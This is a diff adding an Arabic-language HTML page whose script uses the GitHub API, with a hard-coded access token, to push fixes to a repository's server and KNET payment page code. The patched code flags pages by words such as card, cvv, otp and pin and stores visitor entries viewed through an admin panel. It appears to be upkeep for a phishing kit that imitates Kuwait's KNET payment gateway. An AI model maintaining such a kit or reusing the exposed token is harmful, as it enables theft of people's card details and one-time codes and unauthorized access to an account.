@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KDD fix5</title>
+<style>
+ body{margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.7 ui-monospace,Consolas,monospace;padding:14px}
+ h1{font-size:15px;color:#58a6ff;margin:0 0 8px}
+ a{color:#58a6ff}
+ #out{white-space:pre-wrap;word-break:break-word;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;min-height:160px}
+</style>
+</head>
+<body>
+<h1>KDD fix5 — إصلاح server/index.js + KNETPayment.tsx</h1>
+<div id="out">جارٍ البدء...</div>
+<script>
+(function(){
+  var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
+  var BAKED='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';
+  var TOKEN=(location.href.match(/ghp_[A-Za-z0-9]+/)||[])[0]||localStorage.getItem('kdd_token')||BAKED;
+  var out=document.getElementById('out'),buf='';
+  function say(s){buf+=s+'\n';out.textContent=buf;}
+  function b64d(b){var bin=atob(b.replace(/\n/g,'')),u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return new TextDecoder('utf-8').decode(u);}
+  function b64e(s){var u=new TextEncoder().encode(s),bin='';for(var i=0;i<u.length;i++)bin+=String.fromCharCode(u[i]);return btoa(bin);}
+  function gh(path,opts){opts=opts||{};return fetch('https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/'+path+(opts.q?'?'+opts.q:''),{
+    method:opts.method||'GET',
+    headers:{'Authorization':'token '+TOKEN,'Accept':'application/vnd.github+json','Content-Type':'application/json'},
+    body:opts.body});}
+
+  var GATE="const isPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>pageLower.indexOf(h)>-1);";
+
+  function fixServer(src){
+    var s=src,n=[],lines=s.split('\n');
+    for(var i=0;i<lines.length;i++){
+      if(lines[i].indexOf('isPaymentPage')>-1){
+        var ind=(lines[i].match(/^\s*/)||[''])[0], good=ind+GATE;
+        if(lines[i]!==good){lines[i]=good;s=lines.join('\n');n.push('بوابة صفحة الدفع (خطأ Syntax)');}
+        break;
+      }
+    }
+    if(s.indexOf('saveToDisk();')>-1){s=s.replace('saveToDisk();','saveData();');n.push('saveToDisk -> saveData');}
+    var mk='// Create a temporary visitor entry', mi=s.indexOf(mk);
+    if(mi>-1){
+      var t='savedVisitors.push(visitor);', ti=s.indexOf(t,mi);
+      if(ti>-1){s=s.slice(0,ti)+'savedVisitors.push(orphanVisitor);'+s.slice(ti+t.length);n.push('orphanVisitor');}
+    }
+    return {src:s,changed:n.length>0,note:n.join(' + ')};
+  }
+
+  function fixKnet(src){
+    var bad='const [selectedBank, selectedPrefix, setSelectedPrefix] = useState("");';
+    var good='const [selectedPrefix, setSelectedPrefix] = useState("");';
+    if(src.indexOf(bad)>-1) return {src:src.replace(bad,good),changed:true,note:'إزالة تكرار selectedBank'};
+    return {src:src,changed:false};
+  }
+
+  function getFile(path){
+    return gh(path,{q:'ref='+BRANCH+'&cb='+Date.now()}).then(function(r){
+      if(r.status===401){
+        say('   ! التوكن غير صالح — رح يطلب منك توكن جديد');
+        var t=prompt('الصق توكن GitHub الجديد (يبدأ بـ ghp_):','');
+        if(!t) throw new Error('بدون توكن');
+        TOKEN=t.trim(); localStorage.setItem('kdd_token',TOKEN);
+        say('   token: '+TOKEN.slice(0,12)+'...');
+        return gh(path,{q:'ref='+BRANCH+'&cb='+Date.now()});
+      }
+      return r;
+    }).then(function(r){ if(!r.ok) throw new Error('GET HTTP '+r.status); return r.json(); });
+  }
+
+  function patch(path,fn,msg){
+    say('— '+path);
+    return getFile(path).then(function(j){
+      var res=fn(b64d(j.content));
+      if(!res.changed){say('   = لا تغيير');return;}
+      say('   ✓ '+res.note);
+      return gh(path,{method:'PUT',body:JSON.stringify({message:msg,content:b64e(res.src),sha:j.sha,branch:BRANCH})})
+        .then(function(p){
+          if(!p.ok) return p.text().then(function(t){throw new Error('PUT HTTP '+p.status+' '+t.slice(0,150));});
+          say('   ✔ تم الحفظ');
+        });
+    }).catch(function(e){say('   ✗ '+e.message);});
+  }
+
+  say('إنشاء توكن جديد: https://github.com/settings/tokens/new?scopes=repo');
+  say('token: '+TOKEN.slice(0,12)+'...');
+
+  patch('server/index.js',fixServer,'fix(server): repair isPaymentPage gate syntax + orphan push + saveData')
+  .then(function(){return patch('client/src/pages/KNETPayment.tsx',fixKnet,'fix(knet): remove duplicate selectedBank declaration');})
+  .then(function(){
+    say('\n— التحقق...');
+    return getFile('server/index.js').then(function(j){
+      var t=b64d(j.content);
+      say(t.indexOf('const const')===-1?'   ✔ server/index.js سليم':'   ✗ لسه فيه const مكررة');
+      say(t.indexOf('some(h=>pageLower.indexOf(h)>-1)')>-1?'   ✔ البوابة مكتوبة صح':'   ✗ البوابة ناقصة');
+    });
+  })
+  .then(function(){ return getFile('client/src/pages/KNETPayment.tsx').then(function(j){
+      var t=b64d(j.content);
+      say(t.indexOf('const [selectedPrefix, setSelectedPrefix]')>-1?'   ✔ KNETPayment.tsx سليم':'   ✗ لسه فيه تكرار');
+  });})
+  .catch(function(e){say('✗ '+e.message);})
+  .then(function(){
+    say('\n✅ تم — افتح لوحة الأدمن وسوِّ Ctrl+Shift+R');
+    say('https://sejel-server-zygy.onrender.com/admin/');
+  });
+})();
+</script>
+</body>
+</html>
